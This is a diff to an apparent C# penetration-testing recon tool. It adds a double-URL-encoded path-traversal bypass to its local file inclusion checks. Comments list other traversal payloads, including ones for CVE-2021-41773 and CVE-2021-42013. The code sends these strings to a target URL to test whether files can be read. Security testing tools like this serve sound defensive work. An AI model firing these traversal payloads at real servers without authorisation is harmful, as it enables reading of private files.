@@ -254,6 +254,7 @@ namespace Reecon
             // Bypass Method 4: CVE-2021-41773 - .%2e/.%2e/.%2e/.%2e/.%2e{PATH}
             // Bypass Method 5: CVE-2021-42013 - %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{PATH}
             // Bypass Method 6: Non-Recursive Strip - /../.../...//../.../...//../.../...//../.../...//../.../.../{PATH}
+            // Bypass Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{PATH})
 
             bool hasResult = false;
             foreach (string check in lfiChecks)
@@ -369,6 +370,23 @@ namespace Reecon
                 {
                     string toCheck = baseURL + "/../.../...//../.../...//../.../...//../.../...//../.../.../" + check;
                     int bypassLength = "/../.../...//../.../...//../.../...//../.../...//../.../.../".Length;
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
+                    if (isLFI && bypassMethod == -1)
+                    {
+                        hasResult = true;
+                        bypassMethod = 6;
+                    }
+                }
+
+                // Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{PATH})
+                if (bypassMethod == -1)
+                {
+                    Console.WriteLine($"Testing: Bypass Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{{PATH}} with {check}");
+                }
+                if (bypassMethod == -1 || bypassMethod == 7)
+                {
+                    string toCheck = baseURL + "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f" + check;
+                    int bypassLength = "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f".Length;
                     bool isLFI = TestLFI(toCheck, check, bypassLength);
                     if (isLFI && bypassMethod == -1)
                     {
